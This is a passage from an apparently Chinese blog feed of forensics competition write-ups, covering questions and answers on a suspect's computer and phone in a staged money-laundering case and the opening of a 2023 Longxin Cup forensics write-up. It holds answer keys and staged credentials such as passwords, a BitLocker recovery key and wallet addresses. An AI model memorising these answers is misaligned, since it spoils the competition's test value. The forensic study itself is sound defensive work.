src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922971.png" alt="image-20231103195554632"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922914.png" alt="image-20231103195608632"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923018.png" alt="image-20231103195814364"></p><h3 id="95"><a href="#95" class="headerlink" title="95"></a>95</h3><pre><code>[填空题] 根据装置的过往记录，‘log_file’ 是设在 ‘usr/rooney/’ 的哪个已被删除的子文件夹里 (Sub Directory)? (以大写英文回答) (3分)</code></pre><pre><code>RECORD</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923408.png" alt="image-20231103200047231"></p><p>这个路径在刚刚92题已经知道了</p><h2 id="朗尼计算机-手机"><a href="#朗尼计算机-手机" class="headerlink" title="朗尼计算机+手机"></a>朗尼计算机+手机</h2><h3 id="106"><a href="#106" class="headerlink" title="106"></a>106</h3><pre><code>[单选题] 朗尼的计算机有什么软件可以创建比特币钱包 (Bitcoin Wallet)? (1分)A. MetaMaskB. ElectrumC. TrezorD. 以上皆非</code></pre><pre><code>B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923307.png" alt="image-20231103201143392"></p><h3 id="107"><a href="#107" class="headerlink" title="107"></a>107</h3><pre><code>[填空题] 朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址 (Bitcoin Address) 是什么? (以大写英文及阿拉伯数字回答) (1分)</code></pre><pre><code>bc1q0r0l3lh63wy865cd560kn3uhjqrwggvty4zj8n</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923006.png" alt="image-20231103201334458"></p><h3 id="108"><a href="#108" class="headerlink" title="108"></a>108</h3><pre><code>[单选题] 朗尼收取王景浩多少比特币作为清洗黑钱的费用? (1分)A. 1%B. 4%C. 7%D. 10%E. 15%</code></pre><pre><code>D</code></pre><p>查看聊天记录可得</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923331.png" alt="image-20231103212048710"></p><h3 id="109"><a href="#109" class="headerlink" title="109"></a>109</h3><pre><code>[单选题] 朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子 (Recovery Seed) 不包含哪一个英文字? (1分)A. opposeB. areaC. twiceD. roast</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923518.png" alt="image-20231103202237981"></p><h3 id="110"><a href="#110" class="headerlink" title="110"></a>110</h3><pre><code>[单选题] 朗尼的计算机里有多少个加密了 (Encrypted) 的比特币钱包? (1分)A. 1B. 2C. 3D. 4E. 5</code></pre><pre><code>E</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923036.png" alt="image-20231103202303277"></p><h3 id="111"><a href="#111" class="headerlink" title="111"></a>111</h3><pre><code>[单选题] 朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么? (以大写英文及阿拉伯数字回答) (3分)A. DMGB. PDFC. ASDD. ZIPE. PNG</code></pre><pre><code>C</code></pre><p>一个一个搜 找到asd的时候 找到一个<code>儲存自動回復文件1.asd</code> 将其提取出来 将后缀名改为.doc 看到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923001.png" alt="image-20231103204003350"></p><h3 id="112"><a href="#112" class="headerlink" title="112"></a>112</h3><pre><code>[单选题] 朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币? (2分)A. SafepalB. MetamaskC. ChangellyD. Opensea</code></pre><pre><code>C</code></pre><p>在手机中找到一张图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923762.png" alt="image-20231103212358756"></p><h3 id="113"><a href="#113" class="headerlink" title="113"></a>113</h3><pre><code>[单选题] 承上题，这次转换加密货币的日期和时间是什么? (以时区UTC+8回答) (2分)A. 2022-10-07 10:29时B. 2022-10-07 11:06时C. 2022-10-07 11:07时D. 2022-10-07 13:54时</code></pre><pre><code>D</code></pre><p>要找交易完成的时间 也是找到图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923592.png" alt="image-20231103212532558"></p><h3 id="114"><a href="#114" class="headerlink" title="114"></a>114</h3><pre><code>[单选题]朗尼在计算机里采用什么浏览器 (Browser) 及在什么日期时间在他的计算机安装 ‘MetaMask’ ? (以时区UTC+8回答) (1分)A. Chrome 2022-08-25 12:35时B. Chrome 2022-10-07 14:29时C. Firefox 2022-08-25 12:35时D. Firefox 2022-10-07 14:29时</code></pre><pre><code>C</code></pre><p>朗尼计算机中没有火狐浏览器只有谷歌浏览器 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923117.png" alt="image-20231104212545340"></p><p>搜索可得 MetaMask在谷歌浏览器中是一款插件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923101.png" alt="image-20231104212429418"></p><p>在谷歌浏览器中查找历史记录 可以看到安装时间是8-25 12:35</p><h3 id="115"><a href="#115" class="headerlink" title="115"></a>115</h3><pre><code>[单选题] 朗尼在计算机里所创建的非同质化通证 (Non-Fungible Token - NFT) 使用哪一个种区块链 (Blockchain) 技术? (1分)A. EthereumB. PolygonC. SolanaD. ArbitrumE. Klaytn</code></pre><pre><code>A</code></pre><p>在截图中可以看到 使用的区块链技术是Ethereum</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923034.png" alt="image-20231104212616900"></p><h3 id="116"><a href="#116" class="headerlink" title="116"></a>116</h3><pre><code>[单选题] 朗尼在什么日期时间把计算机中创建的非同质化通证 (NFT) 放售? (以时区UTC+8回答) (2分)A. 2022-10-07 14:47时B. 2022-10-07 14:49时C. 2022-10-07 14:52时D. 2022-10-07 14:54时</code></pre><pre><code>B</code></pre><p>我们知道朗尼是在计算机的谷歌浏览器上使用opensea网站进行虚拟币交易的 直接找历史记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170924319.png" alt="image-20231104213257552"></p><h3 id="117"><a href="#117" class="headerlink" title="117"></a>117</h3><pre><code>[多选题] 朗尼的手机里，有什么应用程序与将黑钱 (比特币) 转换成另一加密货币的地址有关? (2分)A. MetamaskB. OpenseaC. SafepalD. YouTube</code></pre><pre><code>B</code></pre><p>图片中显示的网址上是opensea</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170924414.png" alt="image-20231103212623956"></p><h3 id="118"><a href="#118" class="headerlink" title="118"></a>118</h3><pre><code>[单选题] 朗尼的手机里，于2022-10-07，15:07时至15:08时做过什么动作? (以时区UTC+8回答) (2分)A. 登录 ‘Metamask’B. 登录 ‘Opensea’C. 屏幕截图 (Screen Capture)D. 登录 ‘YouTube’</code></pre><p>在时间线中进行过滤 最后只能看到Screenshot的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170926200.png" alt="image-20231104204644074"></p><h3 id="119"><a href="#119" class="headerlink" title="119"></a>119</h3><pre><code>[多选题] 承上题，从这个动作中能找到什么资讯? (1分)A. Opensea.ioB. Ethereum Main NetworkC. Your purchase is completeD. Subtotal = 0.0253 ETHE. Good Luck</code></pre><pre><code>ABCD</code></pre><p>118是屏幕截图 预览看到是一张交易记录截图 内容包含ABCD<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170926952.png" alt="image-20231104205208451"></p><h3 id="120"><a href="#120" class="headerlink" title="120"></a>120</h3><pre><code>[填空题] 在朗尼的计算机旁找到 ‘MetaMask’ 的密码是 ‘opensea741’，找出朗尼计算机里的 ‘MetaMask’ 中有多少加密货币余额? (不要输入 ‘.’，以阿拉伯数字回答，如 0.137 需回答 0137) (2分)</code></pre><pre><code>00247</code></pre><p>需要仿真计算机 由114题得知 MetaMask是下载在朗尼计算机谷歌浏览器中的一款插件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170926920.png" alt="image-20231106150026267"></p><p>输入密码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927703.png" alt="image-20231106150058013"></p><h3 id="121"><a href="#121" class="headerlink" title="121"></a>121</h3><pre><code>[填空题] 朗尼的计算机曾用什么电邮地址登录电邮帐号? (不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM) (1分)</code></pre><pre><code>ROONEYCHAN19830801GMAILCOM</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927493.png" alt="image-20231104213701497"></p><h3 id="122"><a href="#122" class="headerlink" title="122"></a>122</h3><pre><code>[填空题] 什么电邮账号曾接收过上述电邮地址发送的电邮？（不要输入答案中的 ‘@’ 及 ‘.’，以大写英文及阿拉伯数字回答，如 name@mail.com，需回答 NAMEMAILCOM） (1分)</code></pre><pre><code>KINGHOO0W0GMAILCOM</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927404.png" alt="image-20231106172351529"></p><h3 id="123"><a href="#123" class="headerlink" title="123"></a>123</h3><pre><code>[多选题]承上题，上述的电邮附件包含哪些类型的档案? (3分)A. pdfB. docC. pngD. txtE. jpg</code></pre><pre><code>DE</code></pre><p>这个附件是<code>Recovery seed.zip</code> 直接导出 解压之后是两个文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927601.png" alt="image-20231106160731052"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927858.png" alt="image-20231106160720207"></p><p>但是解压出来的两个文件和压缩包的大小并不匹配 使用winrar进行修复  再次进行解压  发现还有一个jpg文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927910.png" alt="image-20231106160953127"></p><h3 id="124"><a href="#124" class="headerlink" title="124"></a>124</h3><pre><code>[填空题] 上述电邮附件里的文件，被遮蔽的英文单字是什么? (以大写英文回答) (3分)</code></pre><pre><code>teach</code></pre><p>倒数三四位看起来是ea</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927641.png" alt="image-20231106165447595"></p><p>在仿真起 在计算机中找到字典<code>C:\Program Files(x86)\Electrum\electrum\wordlist</code> 搜索each  发现只有<code>beach</code>和<code>teach</code></p><p>分别尝试使用这两个种子去恢复钱包 </p><h3 id="125"><a href="#125" class="headerlink" title="125"></a>125</h3><pre><code>[填空题]根据上述电邮附件里找到的回复种子 (Recovery Seed)，计算朗尼在 ‘MetaMask’ 使用的以太币 (Ethereum) 地址。 (提示： BIP-44 derivation path = m/44’/60’/0’/0/0) (以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>0X2AAEAB9592B7A9CE6355ED19D048F86F5EA5D819</code></pre><p>这题其实直接使用第120题给的MetaMask插件登陆密码 就可以看到使用的以太币地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927209.png" alt="image-20231106180402995"></p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><pre><code>[填空题]在朗尼手机于2022年9月30日的 &#39;WhatsApp&#39; 对话里，有一段音讯 (Voice Message) 提到王景浩会给朗尼现金多少作为租用 &#39;VPN&#39; 的租金? (以阿拉伯数字回答) (3分)</code></pre><pre><code>3000</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927750.png" alt="image-20231104214323475"></p><p>这是一段逆向音频 找个在线网站逆回来就好了</p><h3 id="126"><a href="#126" class="headerlink" title="126."></a>126.</h3><pre><code>[单选题]在2022年9月28日18时51分 (UTC+8)，朗尼曾经在手机用WhatsApp与王景浩对话，语句 [有灯，风扇经常在转]，回复这句话的相关语句是什么? (1分)A. 你有推介吗?B. 我之前放在你家的机械运作正常吗?C. 有灯号风扇有转动?D. 帅吗?</code></pre><pre><code>C</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927106.png" alt="image-20231104214547175"></p><h3 id="127"><a href="#127" class="headerlink" title="127."></a>127.</h3><pre><code>[单选题]朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭? (1分)A. 荃湾B. 湾仔C. 九龙城D. 九龙塘</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051123768.png" alt="image-20231105112317657"></p><h3 id="128"><a href="#128" class="headerlink" title="128."></a>128.</h3><pre><code>[填空题]朗尼手机的 &#39;WhatsApp&#39; 号码是什么? ( 号码 ) @s.whatsapp.net? (以阿拉伯数字回答) 85259814785(1分)</code></pre><pre><code>85259814785</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927444.png" alt="image-20231104214247695"></p><h3 id="129"><a href="#129" class="headerlink" title="129."></a>129.</h3><pre><code>[多选题]朗尼的手机曾连接以下哪一个WIFI网络? (2分)A. taiiphoneB. rooneyhomeC. Function RoomD. TP-Link</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927225.png" alt="image-20231104214654844"></p><h3 id="130"><a href="#130" class="headerlink" title="130."></a>130.</h3><pre><code>[单选题]朗尼的手机曾连接WIFI [SSID: faifai], 它的登录密码是什么 ? (2分)A. abcd5678B. aaaa0000C. rooney111D. rdfu1234</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927658.png" alt="image-20231104214708180"></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023龙信杯取证复现</title>
      <link href="/2023/10/18/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9Bwp/"/>
      <url>/2023/10/18/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023龙信杯取证比赛wp"><a href="#2023龙信杯取证比赛wp" class="headerlink" title="2023龙信杯取证比赛wp"></a>2023龙信杯取证比赛wp</h1><h2 id="移动终端取证"><a href="#移动终端取证" class="headerlink" title="移动终端取证"></a>移动终端取证</h2><h3 id="1-请分析涉案手机的设备标识是-。（标准格式：12345678）"><a href="#1-请分析涉案手机的设备标识是-。（标准格式：12345678）" class="headerlink" title="1.请分析涉案手机的设备标识是_______。（标准格式：12345678）"></a>1.请分析涉案手机的设备标识是_______。（标准格式：12345678）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191552470.png" alt="image-20231019155226440"></p><pre><code>85069625</code></pre><h3 id="2-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）"><a href="#2-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）" class="headerlink" title="2.请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）"></a>2.请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）</h3><p>从聊天记录中获得软件名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191604510.png" alt="image-20231019160401481"></p><p>再从应用列表中找到相应应用安装时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191607821.png" alt="image-20231019160746790"></p><pre><code>2022-11-16.19:11:26</code></pre><h3 id="3-此检材共连接过-个WiFi。（标准格式：1）"><a href="#3-此检材共连接过-个WiFi。（标准格式：1）" class="headerlink" title="3.此检材共连接过______个WiFi。（标准格式：1）"></a>3.此检材共连接过______个WiFi。（标准格式：1）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191608461.png" alt="image-20231019160838420"></p><pre><code>6</code></pre><h3 id="4-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）"><a href="#4-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）" class="headerlink" title="4.嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）"></a>4.嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）</h3><p>已读未读软件上是真看不出来 这里学到了 直接查看手机镜像文件的数据库</p><pre><code>\data\com.android.providers.telephony\databases\mmssms.db</code></pre><p>找到之后 用navicat打开数据库文件</p><p>找到<strong>sms</strong> 里面read列数值为0的 就是未读的短信 按照升序排列 可以找到17个未读短信</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191622444.png" alt="image-20231019162252378"></p><pre><code>17</code></pre><h3 id="5-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）"><a href="#5-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）" class="headerlink" title="5.嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：http://www.baidu.com/admin/index.html）"></a>5.嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：<a href="http://www.baidu.com/admin/index.html%EF%BC%89">http://www.baidu.com/admin/index.html）</a></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191629108.png" alt="image-20231019162956073"></p><pre><code>http://m.ziyuanhu.com/pics/1725.html</code></pre><h3 id="6-请分析涉案海报的推广ID是-。（标准格式：123456）"><a href="#6-请分析涉案海报的推广ID是-。（标准格式：123456）" class="headerlink" title="6.请分析涉案海报的推广ID是________。（标准格式：123456）"></a>6.请分析涉案海报的推广ID是________。（标准格式：123456）</h3><pre><code>114092</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191633859.png" alt="image-20231019163320780"></p><h3 id="7-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）"><a href="#7-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）" class="headerlink" title="7.嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）"></a>7.嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）</h3><pre><code>1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191635880.png" alt="image-20231019163507845"></p><h3 id="8-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）"><a href="#8-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）" class="headerlink" title="8.通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）"></a>8.通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）</h3><pre><code>Gq20221101</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191636950.png" alt="image-20231019163630897"></p><h3 id="9-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）"><a href="#9-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）" class="headerlink" title="9.请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）"></a>9.请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）</h3><p>直接在火眼中搜索变声器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191659801.png" alt="image-20231019165910759"></p><p>找到包名</p><pre><code>com.chuci.voice</code></pre><h3 id="10-号商的联系人注册APP的ID是-。（标准格式：12345678）"><a href="#10-号商的联系人注册APP的ID是-。（标准格式：12345678）" class="headerlink" title="10.号商的联系人注册APP的ID是_________。（标准格式：12345678）"></a>10.号商的联系人注册APP的ID是_________。（标准格式：12345678）</h3><p>嫌疑人在蝙蝠APP上与号商联系</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191701916.png" alt="image-20231019170108878"></p><pre><code>36991915</code></pre><h3 id="11-嫌疑人于2022年11月份在-城市。（标准格式：成都）"><a href="#11-嫌疑人于2022年11月份在-城市。（标准格式：成都）" class="headerlink" title="11.嫌疑人于2022年11月份在_______城市。（标准格式：成都）"></a>11.嫌疑人于2022年11月份在_______城市。（标准格式：成都）</h3><p>查看嫌疑人与号商的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310191702610.png" alt="image-20231019170202564"></p><p>嫌疑人说在家 说明并不是在上海</p><p>查看图片的位置信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913396.png" alt="image-20231019213941908"></p><p>经纬度一搜 就可以发现是在苏州</p><pre><code>苏州</code></pre><h3 id="12-嫌疑人共购买-个QQ号。（标准格式：1）"><a href="#12-嫌疑人共购买-个QQ号。（标准格式：1）" class="headerlink" title="12.嫌疑人共购买_______个QQ号。（标准格式：1）"></a>12.嫌疑人共购买_______个QQ号。（标准格式：1）</h3><pre><code>8</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913391.png" alt="image-20231020144711656"></p><p>可以看出 嫌疑人本次购买5个手机号 之前还购买了3个手机号 一共是买了8个</p><h2 id="介质取证"><a href="#介质取证" class="headerlink" title="介质取证"></a>介质取证</h2><h3 id="1-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）"><a href="#1-对PC镜像分析，请确定涉案电脑的开机密码是-。（标准格式：123456）" class="headerlink" title="1.对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）"></a>1.对PC镜像分析，请确定涉案电脑的开机密码是_______。（标准格式：123456）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914248.png" alt="image-20231020160156911"></p><p>火眼仿真直接把密码分析出来了</p><pre><code>Longxin360004</code></pre><h3 id="2-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）"><a href="#2-涉案计算机最后一次正常关机时间-。（标准格式：2023-1-11-11-11-11）" class="headerlink" title="2.涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）"></a>2.涉案计算机最后一次正常关机时间_______。（标准格式：2023-1-11.11:11:11）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913411.png" alt="image-20231020153559435"></p><pre><code>2023-09-16 18:20:34</code></pre><h3 id="3-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）"><a href="#3-分析涉案计算机，在2022年11月4日此电脑共开机时长为-。（标准格式：1小时1分1秒）" class="headerlink" title="3.分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）"></a>3.分析涉案计算机，在2022年11月4日此电脑共开机时长为_______。（标准格式：1小时1分1秒）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914737.png" alt="image-20231020154024398"></p><p>应该是将11月4日这一天的持续时间都加起来</p><pre><code>13:41:16</code></pre><h3 id="4-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-x2F-否）"><a href="#4-对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是-x2F-否）" class="headerlink" title="4.对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）"></a>4.对PC镜像分析，请确认微信是否是开机自启动程序。（标准格式：是&#x2F;否）</h3><pre><code>是</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914543.png" alt="image-20231020154245573"></p><h3 id="5-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）"><a href="#5-检材硬盘中有一个加密分区，给出其中“我的秘密-jpg”文档的解密内容。（标准格式：Longxin0924）" class="headerlink" title="5.检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）"></a>5.检材硬盘中有一个加密分区，给出其中“我的秘密.jpg”文档的解密内容。（标准格式：Longxin0924）</h3><p>在取证大师中直接搜索Bitlocker 找到恢复密钥串</p><pre><code>380633-655996-366696-540353-708532-680647-516516-119647</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913477.png" alt="image-20231020160022809"></p><p>使用恢复密钥串 在火眼中解开加密分区 找到<code>我的秘密.jpg</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914184.png" alt="image-20231020160312218"></p><pre><code>TWltaTEyMzQ=</code></pre><p>解base64</p><pre><code>Mimi1234</code></pre><h3 id="6-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）"><a href="#6-接上题，请问该嫌疑人10月份工资是-元。（标准格式：123）" class="headerlink" title="6.接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）"></a>6.接上题，请问该嫌疑人10月份工资是_______元。（标准格式：123）</h3><pre><code>19821</code></pre><p>之前看到的工资条是假的 使用刚刚在我的秘密中得到的密码 解压下面的压缩包 得到真正的工资条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913786.png" alt="image-20231020162116772"></p><h3 id="7-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）"><a href="#7-对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是-。（标准格式：Longxin0924）" class="headerlink" title="7.对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）"></a>7.对PC镜像进行分析，浏览器中使用过QQ邮箱，请问该邮箱的密码是______。（标准格式：Longxin0924）</h3><pre><code>Longxin@2023</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212159661.png" alt="image-20231021215911585"></p><h3 id="8-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）"><a href="#8-结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D-X-X-1-txt）" class="headerlink" title="8.结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）"></a>8.结合手机镜像分析，得出一个推广ID，请在此检材找到此海报，请写出路径。（标准格式：D:\X\X\1.txt）</h3><p>由手机镜像可知 推广ID是<code>114092</code></p><p>直接在取证大师中进行搜索</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913839.png" alt="image-20231020164520545"></p><p>一共是两张png图片 1.png和2.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240913971.png" alt="image-20231020214827873"></p><p>使用010查看1.png和2.png的内容 发现在2.png的文件尾有隐藏信息银行卡号  因此说的应该是2.png</p><pre><code>C:\Program Files (x86)\Tencent\WeChat\2.png</code></pre><h3 id="9-请找出嫌疑人的2022年收入共-。（标准格式：123）"><a href="#9-请找出嫌疑人的2022年收入共-。（标准格式：123）" class="headerlink" title="9.请找出嫌疑人的2022年收入共_______。（标准格式：123）"></a>9.请找出嫌疑人的2022年收入共_______。（标准格式：123）</h3><p>先使用vc容器将找到的dd容器进行挂载 再用火眼进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212215051.png" alt="image-20231021221508024"></p><p>可以看到被删掉的2022年收入.xlsx</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212215308.png" alt="image-20231021221551271"></p><p>这也验证了第6题的10月份工资</p><p>相加起来 就可以算出2022年收入</p><pre><code>205673</code></pre><h3 id="10-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"><a href="#10-分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）" class="headerlink" title="10.分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）"></a>10.分析此海报，请找到嫌疑人的银行卡号。（标准格式：62225123456321654）</h3><p>在第8题已经分析过了</p><pre><code>6320005020052013476</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212203630.png" alt="image-20231021220320591"></p><h3 id="虚拟币分析"><a href="#虚拟币分析" class="headerlink" title="虚拟币分析"></a>虚拟币分析</h3><h3 id="1-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）"><a href="#1-分析涉案计算机，正确填写中转地址当前的代币种类-。（标准格式：BNB）" class="headerlink" title="1.分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）"></a>1.分析涉案计算机，正确填写中转地址当前的代币种类______。（标准格式：BNB）</h3><p>讲上一部分挂载出的npbk文件提取出来 使用命令查看一下文件类型 发现是7z压缩包 直接进行解压 可以看到一个夜神模拟器的镜像 放到火眼中进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212224604.png" alt="image-20231021222437572"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310212225570.png" alt="image-20231021222543520"></p><p>找到中转地址的代币种类是</p><pre><code>ETH</code></pre><h3 id="2-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）"><a href="#2-分析涉案计算机，正确填写中转地址当前的代币余额数量-。（标准格式：1-23）" class="headerlink" title="2.分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）"></a>2.分析涉案计算机，正确填写中转地址当前的代币余额数量_______。（标准格式：1.23）</h3><p>打开夜神多开模拟器——导入镜像文件——启动模拟器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310240914881.png" alt="image-20231021225141319"></p><p>这里要注意一点  在仿真上之后一定要断网打开这个软件  